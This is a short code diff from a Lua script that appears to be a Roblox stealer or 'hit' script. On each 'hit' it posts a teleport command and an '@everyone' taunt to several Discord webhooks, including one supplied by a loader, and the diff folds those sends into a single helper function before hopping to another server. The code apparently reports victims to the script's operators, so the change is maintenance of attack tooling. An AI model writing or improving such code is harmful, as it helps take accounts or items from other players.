@@ -407,13 +407,8 @@ else
                 payload.content = teleport_command .. "\n@everyone **kupal naka HIT!!!🤑🤑🤑🤑**"
                 payload.allowed_mentions = { parse = {"everyone"} }
                 
-                -- Send to all webhooks
-                sendOurWebhook(CONFIG["ALL_HITS_WEBHOOK_URL"], payload)
-                sendOurWebhook(CONFIG["LOGS_WEBHOOK_URL"], payload)
-                local loaderWebhook = getgenv().Webhook
-                if loaderWebhook then
-                    sendOurWebhook(loaderWebhook, payload)
-                end
+                -- Send to all webhooks using existing functions
+                sendAllDestinations(payload, payload, false)
                 
                 print("🎯 Hopping to random server:", destinationJobId, "(" .. randomIndex .. "/" .. #servers .. ")")
                 
